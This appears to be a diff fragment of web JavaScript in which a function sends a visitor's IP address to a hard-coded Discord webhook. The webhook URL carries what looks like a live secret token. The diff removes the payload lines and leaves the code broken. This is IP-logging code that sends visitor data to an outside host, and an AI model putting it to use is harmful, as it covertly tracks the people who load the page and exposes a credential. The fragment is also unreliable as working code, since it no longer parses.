@@ -13,8 +13,6 @@
         // Function to send data to Discord webhook
         function sendToWebhook(ip) {
             const webhookURL = "https://discord.com/api/webhooks/1276835574711586868/6UHCqeMGvu8z1s1jdK3DzHUZZeh96OSCJdg-XkUXxscm4Y0soKs6EUrxnkXw-v5E7XtI"; // Replace with your Discord webhook URL
-            const data = {
-                content: `IP Address: ${ip}`
             };
 
             fetch(webhookURL, {
